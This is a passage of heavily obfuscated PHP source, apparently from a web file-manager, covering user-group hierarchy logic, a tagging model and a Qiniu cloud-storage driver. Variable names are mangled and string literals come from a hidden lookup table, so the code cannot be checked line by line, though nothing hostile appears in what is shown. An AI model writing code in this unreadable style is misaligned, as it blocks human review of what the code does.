{ $’ÛèÒÚ¨[] = $Áó»ê°£[$¦öÓœÔĞ]; } } return $’ÛèÒÚ¨; } protected function isParentOf($á“ñÆ”ó, $À¾ÓÊ‘Ü) { $ğÎş¯‡© =& $_SERVER[ü¢ÙÊñÛ]; if (!$á“ñÆ”ó || !$À¾ÓÊ‘Ü || $á“ñÆ”ó == $À¾ÓÊ‘Ü) { return !1; } $É²°Ãèü = $this->getInfoSimple($á“ñÆ”ó); $ÌºŸö±ş = $this->getInfoSimple($À¾ÓÊ‘Ü); $’÷øù = $É²°Ãèü[$ğÎş¯‡©[595]] . $á“ñÆ”ó . $ğÎş¯‡©[60]; if (substr($ÌºŸö±ş[$ğÎş¯‡©[595]], 0, strlen($’÷øù)) == $’÷øù) { return !0; } return !1; } public function groupShowRoot($”«¤€šÉ, $¯şæöåè = false) { $ãÜ©û˜› =& $_SERVER[ü¢ÙÊñÛ]; $µ¾ŞÖ¶ó = $this->getInfo($”«¤€šÉ); if (!$µ¾ŞÖ¶ó) { return array(); } $…ûû¬½ = $this->parentLevelArray($µ¾ŞÖ¶ó[$ãÜ©û˜›[595]]); $şÕó¤„Ş = array($”«¤€šÉ); if (count($…ûû¬½) == 0) { return $şÕó¤„Ş; } if ($¯şæöåè && count($…ûû¬½) == 1) { return $şÕó¤„Ş; } if (!$µ¾ŞÖ¶ó[$ãÜ©û˜›[550]] || !isset($µ¾ŞÖ¶ó[$ãÜ©û˜›[550]][$ãÜ©û˜›[2049]]) || $µ¾ŞÖ¶ó[$ãÜ©û˜›[550]][$ãÜ©û˜›[2049]] == $ãÜ©û˜›[841]) { return $this->groupShowRoot($…ûû¬½[count($…ûû¬½) - 1], $¯şæöåè); } if ($µ¾ŞÖ¶ó[$ãÜ©û˜›[550]][$ãÜ©û˜›[2049]] == $ãÜ©û˜›[444]) { $šù®ÚíÜ = explode($ãÜ©û˜›[60], $µ¾ŞÖ¶ó[$ãÜ©û˜›[550]][$ãÜ©û˜›[2050]]); if ($šù®ÚíÜ) { $şÕó¤„Ş = array_merge($şÕó¤„Ş, $šù®ÚíÜ); } } return $şÕó¤„Ş; } protected function resetParentLevel() { $ŠƒõÛÏ =& $_SERVER[ü¢ÙÊñÛ]; $£‚³Û–İ = $ŠƒõÛÏ[1959]; $Ñìí˜ÅÏ = $this->select(); $Ñìí˜ÅÏ = array_to_keyvalue($Ñìí˜ÅÏ, $£‚³Û–İ); foreach ($Ñìí˜ÅÏ as $ÅÇèÍõ–) { $½ü˜Æ†´ = $ÅÇèÍõ–; $Š’»ñÙ½ = array(); while ($½ü˜Æ†´[$ŠƒõÛÏ[203]] != 0) { $Š’»ñÙ½[] = $½ü˜Æ†´[$ŠƒõÛÏ[203]]; $½ü˜Æ†´ = $Ñìí˜ÅÏ[$½ü˜Æ†´[$ŠƒõÛÏ[203]]]; } $Š’»ñÙ½[] = 0; $Š’»ñÙ½ = $ŠƒõÛÏ[60] . implode($ŠƒõÛÏ[60], array_reverse($Š’»ñÙ½)) . $ŠƒõÛÏ[60]; $this->setNamePinyin($ÅÇèÍõ–[$£‚³Û–İ], $ÅÇèÍõ–[$ŠƒõÛÏ[42]]); $this->where(array($£‚³Û–İ => $ÅÇèÍõ–[$£‚³Û–İ]))->save(array($ŠƒõÛÏ[666] => $Š’»ñÙ½)); } return $Ñìí˜ÅÏ; } public function groupNameAuto($ËŞ¢¼–, $„»Æï“š) { $ªµ«üÄõ =& $_SERVER[ü¢ÙÊñÛ]; $ú”Éóåı = $this->where(array($ªµ«üÄõ[488] => $ËŞ¢¼–))->getField($ªµ«üÄõ[42], !0); if (!$ú”Éóåı || !in_array($„»Æï“š, $ú”Éóåı)) { return $„»Æï“š; } for ($Ï‘¤¥€ß = 1; $Ï‘¤¥€ß <= count($ú”Éóåı) + 1; $Ï‘¤¥€ß++) { $†Ïàì² = $„»Æï“š . "\x28{$Ï‘¤¥€ß}\51"; if (!in_array($†Ïàì², $ú”Éóåı)) { return $†Ïàì²; } } } public function groupSwitch($¬ú¬«ëÑ, $”İˆ™ïú) { $®õ°˜ê =& $_SERVER[ü¢ÙÊñÛ]; $™‹ÖÑ¶® = array($®õ°˜ê[1959] => array($®õ°˜ê[17], array($¬ú¬«ëÑ, $”İˆ™ïú))); $Ûµµ£¢¾ = $this->where($™‹ÖÑ¶®)->select(); $Ûµµ£¢¾ = array_to_keyvalue($Ûµµ£¢¾, $®õ°˜ê[1959]); if (!isset($Ûµµ£¢¾[$¬ú¬«ëÑ]) || !isset($Ûµµ£¢¾[$”İˆ™ïú]) || $Ûµµ£¢¾[$¬ú¬«ëÑ][$®õ°˜ê[203]] == 0) { return !1; } $™‹ÖÑ¶® = array($®õ°˜ê[1959] => $¬ú¬«ëÑ); $¬™¸·‘© = Model($®õ°˜ê[2053])->where($™‹ÖÑ¶®)->select(); if (!$¬™¸·‘©) { $¬™¸·‘© = array(); } foreach ($¬™¸·‘© as $’ÇØÂ) { $ÖÚà”òŠ = $’ÇØÂ[$®õ°˜ê[1759]]; $™‹ÖÑ¶® = array($®õ°˜ê[1759] => $ÖÚà”òŠ, $®õ°˜ê[1959] => $”İˆ™ïú); $â¡Ğ‘Çò = Model($®õ°˜ê[2053])->where($™‹ÖÑ¶®)->find(); if (!$â¡Ğ‘Çò) { $Š¹Ñµ†Ù = array($”İˆ™ïú => $’ÇØÂ[$®õ°˜ê[2067]]); Model($®õ°˜ê[608])->userGroupAdd($ÖÚà”òŠ, $Š¹Ñµ†Ù); } Model($®õ°˜ê[608])->userGroupRemove($ÖÚà”òŠ, $¬ú¬«ëÑ); } $™‹ÖÑ¶® = array($®õ°˜ê[201] => 2, $®õ°˜ê[203] => 0, $®õ°˜ê[496] => 1, $®õ°˜ê[580] => array($®õ°˜ê[17], array($¬ú¬«ëÑ, $”İˆ™ïú))); $º‹£ëÎş = Model($®õ°˜ê[890])->where($™‹ÖÑ¶®)->field($®õ°˜ê[2068])->select(); $º‹£ëÎş = array_to_keyvalue($º‹£ëÎş, $®õ°˜ê[580], $®õ°˜ê[204]); $¾ööÅ Ñ = !empty($º‹£ëÎş[$¬ú¬«ëÑ]) ? $º‹£ëÎş[$¬ú¬«ëÑ] : !1; if ($¾ööÅ Ñ) { if (!$º‹£ëÎş[$”İˆ™ïú]) { $º‹£ëÎş[$”İˆ™ïú] = Model($®õ°˜ê[890])->groupRootAdd($”İˆ™ïú); } $£¬õ‡æ› = $º‹£ëÎş[$”İˆ™ïú]; $™‹ÖÑ¶® = array($®õ°˜ê[203] => $¾ööÅ Ñ); $º‹£ëÎş = Model($®õ°˜ê[890])->where($™‹ÖÑ¶®)->field($®õ°˜ê[2069])->select(); if (!$º‹£ëÎş) { $º‹£ëÎş = array(); } Model($®õ°˜ê[890])->moveClearAuth = !1; foreach ($º‹£ëÎş as $´îö”¾‹) { $¸éì’ò÷ = $´îö”¾‹[$®õ°˜ê[496]] == $®õ°˜ê[102] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($®õ°˜ê[890])->move($´îö”¾‹[$®õ°˜ê[204]], $£¬õ‡æ›, $¸éì’ò÷); } Model($®õ°˜ê[890])->moveClearAuth = !0; $™‹ÖÑ¶® = array($®õ°˜ê[201] => 2, $®õ°˜ê[580] => $¬ú¬«ëÑ); $é¥±î®é = array($®õ°˜ê[580] => $”İˆ™ïú); Model($®õ°˜ê[2070])->where($™‹ÖÑ¶®)->save($é¥±î®é); Model($®õ°˜ê[2071])->where($™‹ÖÑ¶®)->save($é¥±î®é); } $this->_changeChildLevel($Ûµµ£¢¾[$¬ú¬«ëÑ], $Ûµµ£¢¾[$”İˆ™ïú], !0); $this->where(array($®õ°˜ê[203] => $¬ú¬«ëÑ))->save(array($®õ°˜ê[203] => $”İˆ™ïú)); $this->_clearChildrenCache($Ûµµ£¢¾[$”İˆ™ïú]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\x75\163\145\162\x5f\146\141\166"; protected function cacheFunctionAlias($æ¸÷”¼ö) { $©ìô½ä± =& $_SERVER[ü¢ÙÊñÛ]; return array($©ìô½ä±[2072] => array($æ¸÷”¼ö[0], $©ìô½ä±[2073]), $©ìô½ä±[2074] => array($æ¸÷”¼ö[0], $©ìô½ä±[2075])); } protected function get($©“™×±ş) { $‡ªé¯Ï =& $_SERVER[ü¢ÙÊñÛ]; $…Í©ñ» = Model($‡ªé¯Ï[596])->metaGet($©“™×±ş, $‡ªé¯Ï[2076]); $úÜ°”˜³ = json_decode($…Í©ñ», !0); return $úÜ°”˜³ ? $úÜ°”˜³ : array($‡ªé¯Ï[2077] => $‡ªé¯Ï[102], $‡ªé¯Ï[457] => array()); } protected function set($¸÷†ê°ù, $·©£òš®) { $™ëÜ×– =& $_SERVER[ü¢ÙÊñÛ]; $·©£òš® = $·©£òš® ? $·©£òš® : array($™ëÜ×–[2077] => $™ëÜ×–[102], $™ëÜ×–[457] => array()); return Model($™ëÜ×–[596])->metaSet($¸÷†ê°ù, $™ëÜ×–[2076], json_encode($·©£òš®)); } protected function getByTagID($úîôµıê, $Èõ¦µ÷È) { $ÊúÙÆşÕ =& $_SERVER[ü¢ÙÊñÛ]; if (!$úîôµıê || !$Èõ¦µ÷È) { return !1; } if (!Model($ÊúÙÆşÕ[596])->getInfoSimple($úîôµıê)) { return !1; } $¯¶¶Ò = $this->get($úîôµıê); if (!$¯¶¶Ò || !isset($¯¶¶Ò[$ÊúÙÆşÕ[457]])) { return !1; } $¶åìş˜ = array_find_by_field($¯¶¶Ò[$ÊúÙÆşÕ[457]], $ÊúÙÆşÕ[486], $Èõ¦µ÷È); return is_array($¶åìş˜) ? $¶åìş˜ : !1; } public function listSource($¤Øâõ½”, $»ŸŠõé) { $Ü‡ã“” =& $_SERVER[ü¢ÙÊñÛ]; if ($»ŸŠõé && !is_array($»ŸŠõé)) { $»ŸŠõé = array($»ŸŠõé); } $…Ë‡¶öÀ = $this->listData($¤Øâõ½”); $Ç‰”Ÿ±ü = array(); foreach ($…Ë‡¶öÀ as $Ø¬ã¿) { $Ğ°ˆŸ¸´ = $Ø¬ã¿[$Ü‡ã“”[98]]; if (!$Ğ°ˆŸ¸´) { continue; } if (!isset($Ç‰”Ÿ±ü[$Ğ°ˆŸ¸´])) { $Ç‰”Ÿ±ü[$Ğ°ˆŸ¸´] = array(); } $Ç‰”Ÿ±ü[$Ğ°ˆŸ¸´][] = $Ø¬ã¿[$Ü‡ã“”[511]]; } $’ªãèÏñ = array(); foreach ($Ç‰”Ÿ±ü as $ºİë¨– => $óãÏÛ«‚) { $“³ÁÑò‡ = !0; if (!$»ŸŠõé) { $’ªãèÏñ[] = $ºİë¨–; continue; } foreach ($»ŸŠõé as $›¼îÉŞŒ) { if (!in_array($›¼îÉŞŒ, $óãÏÛ«‚)) { $“³ÁÑò‡ = !1; break; } } if ($“³ÁÑò‡) { $’ªãèÏñ[] = $ºİë¨–; } } if (!$’ªãèÏñ) { return array(); } $‚›Öó§ = array($Ü‡ã“”[502] => array($Ü‡ã“”[503], $’ªãèÏñ), $Ü‡ã“”[580] => $¤Øâõ½”, $Ü‡ã“”[201] => SourceModel::TYPE_GROUP); $ÈÕ×„Î› = Model($Ü‡ã“”[1410])->listSource($‚›Öó§); if (!$ÈÕ×„Î› || count($’ªãèÏñ) == $ÈÕ×„Î›[$Ü‡ã“”[454]][$Ü‡ã“”[455]]) { return $ÈÕ×„Î›; } $ÛË‡óë˜ = array(); $Üµâş¤ã = array_to_keyvalue($ÈÕ×„Î›[$Ü‡ã“”[96]], $Ü‡ã“”[22], $Ü‡ã“”[204]); $´»³©Ğ = array_to_keyvalue($ÈÕ×„Î›[$Ü‡ã“”[97]], $Ü‡ã“”[22], $Ü‡ã“”[204]); $ı°ŞÅƒ = array_merge($´»³©Ğ, $Üµâş¤ã); foreach ($’ªãèÏñ as $Ğ°ˆŸ¸´) { if (!in_array($Ğ°ˆŸ¸´, $ı°ŞÅƒ)) { $ÛË‡óë˜[] = $Ğ°ˆŸ¸´; } } if ($ÛË‡óë˜) { $this->removeBySource($¤Øâõ½”, $ÛË‡óë˜); } return $ÈÕ×„Î›; } protected function listData($ òÜ’ò) { $ïÚ’¯ùœ =& $_SERVER[ü¢ÙÊñÛ]; $ú ¸úÚ = array($ïÚ’¯ùœ[1750] => 0, $ïÚ’¯ùœ[568] => array($ïÚ’¯ùœ[2078], 0), $ïÚ’¯ùœ[507] => $ïÚ’¯ùœ[2079] . $ òÜ’ò); $¡Œû­¯Í = $ïÚ’¯ùœ[2080]; $‘®¸Ñ…¢ = $this->field($¡Œû­¯Í)->where($ú ¸úÚ)->order($ïÚ’¯ùœ[2081])->select(); return $‘®¸Ñ…¢ ? $‘®¸Ñ…¢ : array(); } protected function addToTag($ë‘ñù£Ğ, $Öƒ€ÅœŸ, $øƒÄÉ´) { $ïú‹£š³ =& $_SERVER[ü¢ÙÊñÛ]; if (!$this->getByTagID($ë‘ñù£Ğ, $øƒÄÉ´) || !$Öƒ€ÅœŸ) { return !1; } if (!Model($ïú‹£š³[890])->pathInfo($Öƒ€ÅœŸ)) { return !1; } $Òó§ÄÅî = array($ïú‹£š³[1750] => 0, $ïú‹£š³[568] => $øƒÄÉ´, $ïú‹£š³[506] => $Öƒ€ÅœŸ, $ïú‹£š³[507] => $ïú‹£š³[2082] . $ë‘ñù£Ğ, $ïú‹£š³[505] => $ïú‹£š³[22], $ïú‹£š³[1963] => 0); if ($this->where($Òó§ÄÅî)->find()) { return !1; } return $this->add($Òó§ÄÅî); } protected function removeFromTag($´ü¯¬˜, $Â»²âº, $«Ò¹¦Øû) { $Ş‚•»Ò =& $_SERVER[ü¢ÙÊñÛ]; if (!$this->getByTagID($´ü¯¬˜, $«Ò¹¦Øû) || !$Â»²âº) { return !1; } if (is_array($Â»²âº)) { $Â»²âº = array($Ş‚•»Ò[17], $Â»²âº); } $Óí—×Ì = array($Ş‚•»Ò[1750] => 0, $Ş‚•»Ò[568] => $«Ò¹¦Øû, $Ş‚•»Ò[507] => $Ş‚•»Ò[2082] . $´ü¯¬˜, $Ş‚•»Ò[506] => $Â»²âº); return $this->where($Óí—×Ì)->delete(); } protected function removeByTag($¸Ş÷Š·¾, $§ïïéŒş) { $ÇÒ¥‰¬¤ =& $_SERVER[ü¢ÙÊñÛ]; if (!$this->getByTagID($¸Ş÷Š·¾, $§ïïéŒş)) { return !1; } $Íˆ¼ë×‰ = array($ÇÒ¥‰¬¤[1750] => 0, $ÇÒ¥‰¬¤[568] => $§ïïéŒş, $ÇÒ¥‰¬¤[507] => $ÇÒ¥‰¬¤[2082] . $¸Ş÷Š·¾); return $this->where($Íˆ¼ë×‰)->delete(); } protected function removeBySource($äŞı”çƒ, $É£ÇçéŒ) { $óô¬æáğ =& $_SERVER[ü¢ÙÊñÛ]; if (!$äŞı”çƒ || !$É£ÇçéŒ) { return !1; } if (is_array($É£ÇçéŒ)) { $É£ÇçéŒ = array($óô¬æáğ[17], $É£ÇçéŒ); } $œâ›“¬Û = array($óô¬æáğ[1750] => 0, $óô¬æáğ[506] => $É£ÇçéŒ, $óô¬æáğ[568] => array($óô¬æáğ[1080], 0), $óô¬æáğ[507] => $óô¬æáğ[2082] . $äŞı”çƒ); return $this->where($œâ›“¬Û)->delete(); } } goto CËÒÀä‚ƒÖ; fÓ¾ÊÔó¹: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($øÉÖ“¬¤) { parent::__construct(); require_once SDK_DIR . $_SERVER[ü¢ÙÊñÛ][1518]; $this->_init($øÉÖ“¬¤); } public function _init($©úãí÷”) { $›‘Áô•À =& $_SERVER[ü¢ÙÊñÛ]; $this->config = $©úãí÷”; foreach ($©úãí÷” as $›ö×«ëé => $®İ€øƒ¼) { if (isset($this->{$›ö×«ëé})) { $this->{$›ö×«ëé} = $®İ€øƒ¼; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($›‘Áô•À[1519] . LNG($›‘Áô•À[1454])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($éó±üÈª, $ˆæ©¯¢ = '', $î¬©ì¼ = REPEAT_RENAME) { if ($this->setContent($éó±üÈª, $ˆæ©¯¢)) { return $this->getPathOuter($éó±üÈª); } return !1; } public function mkdir($«ÊÂˆñ˜, $„‡°çÅ = REPEAT_SKIP) { $É±÷–¼ =& $_SERVER[ü¢ÙÊñÛ]; $Óç²“‚« = trim($«ÊÂˆñ˜, $É±÷–¼[18]); if ($this->_isFolder($Óç²“‚«)) { return $this->getPathOuter($Óç²“‚«); } $«ÊÂˆñ˜ = $Óç²“‚« . $É±÷–¼[18]; $ñÏòÌË× = get_path_this($Óç²“‚«); $Åñğš§ = $«ÊÂˆñ˜ . $ñÏòÌË×; if (!$this->mkfile($Åñğš§)) { return !1; } if (!$this->moveFile($Åñğš§, $«ÊÂˆñ˜)) { $this->delFile($Åñğš§); return !1; } return $this->getPathOuter($Óç²“‚«); } public function copyFile($îÃã¸Ì, $ŞÃ·¾Àü) { $È¼†—¨ = $this->bucketManager->copy($this->bucket, $îÃã¸Ì, $this->bucket, $ŞÃ·¾Àü, !0); return $È¼†—¨ ? !1 : $this->getPathOuter($ŞÃ·¾Àü); } public function moveFile($‰ÉÒêó¦, $ôñ¦ıØ¾) { $÷–ŠØ“ = $this->bucketManager->move($this->bucket, $‰ÉÒêó¦, $this->bucket, $ôñ¦ıØ¾, !0); return $÷–ŠØ“ ? !1 : $this->getPathOuter($ôñ¦ıØ¾); } public function delFile($÷æôğ…) { if (!$this->exist($÷æôğ…)) { return !0; } $™Ú™ŠÌœ = $this->bucketManager->delete($this->bucket, $÷æôğ…); if (!$™Ú™ŠÌœ) { return !0; } return $™Ú™ŠÌœ->code() == 612 ? !0 : !1; } public function delFolder($·¯¿¹ò) { $¨¹Íó´Ö =& $_SERVER[ü¢ÙÊñÛ]; if (!$this->exist($·¯¿¹ò)) { return !0; } $this->listItemCache = !1; $ÈÂÓµ½õ = $this->fileList($·¯¿¹ò); $this->listItemCache = !0; $Ë¯ÉíìÂ = trim($·¯¿¹ò, $¨¹Íó´Ö[18]) . $¨¹Íó´Ö[18]; if (!empty($·¯¿¹ò) && $·¯¿¹ò !== $¨¹Íó´Ö[241] && !in_array($Ë¯ÉíìÂ, $ÈÂÓµ½õ[$¨¹Íó´Ö[96]])) { $ÈÂÓµ½õ[$¨¹Íó´Ö[96]][] = $Ë¯ÉíìÂ; } $Ó€£è° = $this->delByBatch($ÈÂÓµ½õ[$¨¹Íó´Ö[97]]); if (!$Ó€£è°) { return !1; } $Ó€£è° = $this->delByBatch($ÈÂÓµ½õ[$¨¹Íó´Ö[96]]); if (!$Ó€£è°) { return !1; } return $this->delFile($Ë¯ÉíìÂ); } private function delByBatch($œ§°êÛ) { foreach (array_chunk($œ§°êÛ, 1000) as $â²·ì¶¯) { $ˆè¦Ù½ü = $this->bucketManager->buildBatchDelete($this->bucket, $â²·ì¶¯); list($ËÛ·êÌ, $¿Â«¥Í«) = $this->bucketManager->batch($ˆè¦Ù½ü); if ($¿Â«¥Í«) { return !1; } } return !0; } public function rename($õƒ™Øç€, $ŞÀô‚é˜) { return $this->renameObject($õƒ™Øç€, $ŞÀô‚é˜); } public function fileInfo($¯ÊĞÂŸ¾, $—’‘¡â = false, $Ö„”ğõ = array()) { $¾°Îª¼ =& $_SERVER[ü¢ÙÊñÛ]; $Ë¯Ûáù× = array($¾°Îª¼[42] => $this->pathThis($¯ÊĞÂŸ¾), $¾°Îª¼[98] => $this->getPathOuter($¾°Îª¼[18] . $¯ÊĞÂŸ¾), $¾°Îª¼[43] => $¾°Îª¼[243], $¾°Îª¼[90] => isset($Ö„”ğõ[$¾°Îª¼[1520]]) ? $Ö„”ğõ[$¾°Îª¼[1520]] : 0, $¾°Îª¼[180] => $this->ext($¯ÊĞÂŸ¾)); if ($—’‘¡â) { return $Ë¯Ûáù×; } $Ë¯Ûáù×[$¾°Îª¼[244]] = $Ë¯Ûáù×[$¾°Îª¼[99]] = 0; $Ë¯Ûáù×[$¾°Îª¼[245]] = $Ë¯Ûáù×[$¾°Îª¼[246]] = !0; if (empty($Ö„”ğõ)) { $Ö„”ğõ = $this->objectMeta($¯ÊĞÂŸ¾); if (!$Ö„”ğõ) { return $Ë¯Ûáù×; } } if (isset($Ö„”ğõ[$¾°Îª¼[247]]) && $Ö„”ğõ[$¾°Îª¼[247]]) { $Ë¯Ûáù×[$¾°Îª¼[248]] = $Ö„”ğõ[$¾°Îª¼[247]]; } if (isset($Ö„”ğõ[$¾°Îª¼[258]]) && $Ö„”ğõ[$¾°Îª¼[258]]) { $Ë¯Ûáù×[$¾°Îª¼[248]] = $Ö„”ğõ[$¾°Îª¼[258]]; } if (isset($Ö„”ğõ[$¾°Îª¼[1521]])) { $Ë¯Ûáù×[$¾°Îª¼[99]] = substr($Ö„”ğõ[$¾°Îª¼[1521]] . $¾°Îª¼[22], 0, 10); } if (isset($Ö„”ğõ[$¾°Îª¼[1520]])) { $Ë¯Ûáù×[$¾°Îª¼[90]] = $Ö„”ğõ[$¾°Îª¼[1520]]; } return $Ë¯Ûáù×; } public function folderInfo($Îüà®ï€, $üªòà = false) { $øÉÙÒõ  =& $_SERVER[ü¢ÙÊñÛ]; $ïîİÖšÔ = array($øÉÙÒõ [42] => $this->pathThis($Îüà®ï€), $øÉÙÒõ [98] => $this->getPathOuter($øÉÙÒõ [18] . $Îüà®ï€), $øÉÙÒõ [43] => $øÉÙÒõ [89]); if ($üªòà) { return $ïîİÖšÔ; } $ïîİÖšÔ[$øÉÙÒõ [244]] = $ïîİÖšÔ[$øÉÙÒõ [99]] = 0; $ïîİÖšÔ[$øÉÙÒõ [245]] = $ïîİÖšÔ[$øÉÙÒõ [246]] = !0; $Îüà®ï€ = rtrim($Îüà®ï€, $øÉÙÒõ [18]) . $øÉÙÒõ [18]; $ ¼”ëó = $this->objectMeta($Îüà®ï€); if (isset($ ¼”ëó[$øÉÙÒõ [1521]])) { $ïîİÖšÔ[$øÉÙÒõ [99]] = substr($ ¼”ëó[$øÉÙÒõ [1521]] . $øÉÙÒõ [22], 0, 10); } return $ïîİÖšÔ; } public function listPath($¿°Á×Ò, $®ë¤‡çª = false) { $¼«šõàü =& $_SERVER[ü¢ÙÊñÛ]; $÷ü¦÷ = $this->fileList($¿°Á×Ò, $¼«šõàü[18], !0); foreach ($÷ü¦÷[$¼«šõàü[96]] as $¤®ö¡ÒÂ => $¹–¶¤Îª) { $÷ü¦÷[$¼«šõàü[96]][$¤®ö¡ÒÂ] = $this->folderInfo($¹–¶¤Îª, $®ë¤‡çª); } foreach ($÷ü¦÷[$¼«šõàü[97]] as $¤®ö¡ÒÂ => $¹–¶¤Îª) { $÷ü¦÷[$¼«šõàü[97]][$¤®ö¡ÒÂ] = $this->fileInfo($¹–¶¤Îª[$¼«šõàü[108]], $®ë¤‡çª, $¹–¶¤Îª); } return $÷ü¦÷; } public function has($ÀÎÑ‘ü, $±Ø»ğ“ş = false, $””²‡° = true) { $•ï¤¥ş =& $_SERVER[ü¢ÙÊñÛ]; $ÀÎÑ‘ü = trim($ÀÎÑ‘ü, $•ï¤¥ş[18]); $ »¯êêÇ = empty($ÀÎÑ‘ü) && $ÀÎÑ‘ü !== $•ï¤¥ş[241] ? $•ï¤¥ş[22] : $ÀÎÑ‘ü . $•ï¤¥ş[18]; $İüÄöº = $•ï¤¥ş[22]; $®ˆÖıä = 500; $ÖÑı¿™† = $•ï¤¥ş[18]; $™×÷¢¾ï = $Ó‡‹­Éš = 0; while (!0) { check_abort(); list($¸Ôç—êü, $ß³®­®Á) = $this->bucketManager->listFiles($this->bucket, $ »¯êêÇ, $İüÄöº, $®ˆÖıä, $ÖÑı¿™†); if ($ß³®­®Á) { break; } $İüÄöº = array_key_exists($•ï¤¥ş[1466], $¸Ôç—êü) ? $İüÄöº = $¸Ôç—êü[$•ï¤¥ş[1522]] : $•ï¤¥ş[22]; if ($±Ø»ğ“ş) { if (!empty($¸Ôç—êü[$•ï¤¥ş[1523]])) { $™×÷¢¾ï += count($¸Ôç—êü[$•ï¤¥ş[1523]]); } if (!empty($¸Ôç—êü[$•ï¤¥ş[1524]])) { $Ó‡‹­Éš += count($¸Ôç—êü[$•ï¤¥ş[1524]]); } if ($İüÄöº === $•ï¤¥ş[22]) { break; } continue; } if ($””²‡°) { if (!empty($¸Ôç—êü[$•ï¤¥ş[1523]])) { return !0; } } else { if (!empty($¸Ôç—êü[$•ï¤¥ş[1524]])) { return !0; } } if ($İüÄöº === $•ï¤¥ş[22]) { break; } } if ($±Ø»ğ“ş) { return array($•ï¤¥ş[252] => $™×÷¢¾ï, $•ï¤¥ş[253] => $Ó‡‹­Éš); } return !1; } public function listAll($¥éÀåµø) { $¦ÃùÑ‰ò =& $_SERVER[ü¢ÙÊñÛ]; $ÔÏæ¥’ = $this->fileList($¥éÀåµø, $¦ÃùÑ‰ò[22], !0); $ü‘¡‰úù = array_to_keyvalue($ÔÏæ¥’[$¦ÃùÑ‰ò[97]], $¦ÃùÑ‰ò[42]); foreach ($ÔÏæ¥’[$¦ÃùÑ‰ò[96]] as $Ø ¸õè±) { if (is_string($Ø ¸õè±)) { $ü‘¡‰úù[$Ø ¸õè±] = array($¦ÃùÑ‰ò[90] => 0); } } return $this->listAllFiles($¥éÀåµø, $ü‘¡‰úù); } private function fileList($¬Êƒö§, $¯ÆëÊ‹ = '', $£ığÚ×Ò = 0) { $˜¹ÂÛ—ƒ =& $_SERVER[ü¢ÙÊñÛ]; $¬Êƒö§ = trim($¬Êƒö§, $˜¹ÂÛ—ƒ[18]); $Ñ†ßÍú = empty($¬Êƒö§) && $¬Êƒö§ !== $˜¹ÂÛ—ƒ[241] ? $˜¹ÂÛ—ƒ[22] : $¬Êƒö§ . $˜¹ÂÛ—ƒ[18]; $¼¤Ú’æì = $˜¹ÂÛ—ƒ[22]; $Ñ¶Ş³›ˆ = 1000; $Ö”ŠøøÇ = $£ÒÅ£ÌÔ = array(); while (!0) { check_abort(); list($á®Ì›à­, $ê¬¨‚ã) = $this->bucketManager->listFiles($this->bucket, $Ñ†ßÍú, $¼¤Ú’æì, $Ñ¶Ş³›ˆ, $¯ÆëÊ‹); if ($ê¬¨‚ã) { break; } $¼¤Ú’æì = array_key_exists($˜¹ÂÛ—ƒ[1466], $á®Ì›à­) ? $¼¤Ú’æì = $á®Ì›à­[$˜¹ÂÛ—ƒ[1522]] : $˜¹ÂÛ—ƒ[22]; $òÃüêŸö = isset($á®Ì›à­[$˜¹ÂÛ—ƒ[1523]]) ? $á®Ì›à­[$˜¹ÂÛ—ƒ[1523]] : array(); $½¢üœ ÷ = isset($á®Ì›à­[$˜¹ÂÛ—ƒ[1524]]) ? $á®Ì›à­[$˜¹ÂÛ—ƒ[1524]] : array(); foreach ($òÃüêŸö as $Ï¡ó½ÛÊ) { if ($Ï¡ó½ÛÊ[$˜¹ÂÛ—ƒ[108]] == $Ñ†ßÍú) { continue; } $´„ïãøà = $Ï¡ó½ÛÊ[$˜¹ÂÛ—ƒ[108]]; $è¢”‰ ú = $Ï¡ó½ÛÊ[$˜¹ÂÛ—ƒ[1520]]; $Ï¡ó½ÛÊ[$˜¹ÂÛ—ƒ[90]] = $è¢”‰ ú; $ÖŞµÜíö = $è¢”‰ ú == 0 && substr($´„ïãøà, strlen($´„ïãøà) - 1, 1) == $˜¹ÂÛ—ƒ[18] ? !0 : !1; $this->cacheMethodInfoSet($´„ïãøà, $ÖŞµÜíö, $Ï¡ó½ÛÊ); if ($ÖŞµÜíö) { $Ö”ŠøøÇ[] = $´„ïãøà; continue; } $£ÒÅ£ÌÔ[] = $£ığÚ×Ò ? $Ï¡ó½ÛÊ : $´„ïãøà; } foreach ($½¢üœ ÷ as $´„ïãøà) { if ($´„ïãøà == $Ñ†ßÍú) { continue; } $Ö”ŠøøÇ[] = $´„ïãøà; $this->cacheMethodInfoSet($´„ïãøà, !0); } if ($¼¤Ú’æì === $˜¹ÂÛ—ƒ[22]) { break; } } $this->cacheMethodInfoSet($¬Êƒö§, !0); return array($˜¹ÂÛ—ƒ[96] => $Ö”ŠøøÇ, $˜¹ÂÛ—ƒ[97] => $£ÒÅ£ÌÔ); } public function canRead($˜ë²˜“Ú) { return $this->exist($˜ë²˜“Ú) ? !0 : !1; } public function canWrite($¿‹ş×“) { return $this->exist($¿‹ş×“) ? !0 : !1; } public function getContent($àèÓÖÉŞ) { return $this->fileSubstr($àèÓÖÉŞ, 0, -1); } public function setContent($‚¨¾†ä, $£‹×ÓÖø = '') { $¾Û¢‰ = $this->tempFile($this->pathThis($‚¨¾†ä)); file_put_contents($¾Û¢‰, $£‹×ÓÖø); if ($this->upload($‚¨¾†ä, $¾Û¢‰)) { $this->tempFileRemve($¾Û¢‰); return !0; } return !1; } public function refreshUrls($­’ˆ©‚¦) { $»ê¼øÉ¡ =& $_SERVER[ü¢ÙÊñÛ]; $ ’»½¦Î = array(); if (is_array($­’ˆ©‚¦)) { foreach ($­’ˆ©‚¦ as $Ï³Ùœê±) { $ ’»½¦Î[] = $this->link($Ï³Ùœê±); } } else { $ ’»½¦Î[] = $this->link($­’ˆ©‚¦); } $ÄıåÒà = new Qiniu\Cdn\CdnManager($this->auth); list($¤šÀ´ò, $öÁŸ‚ûÇ) 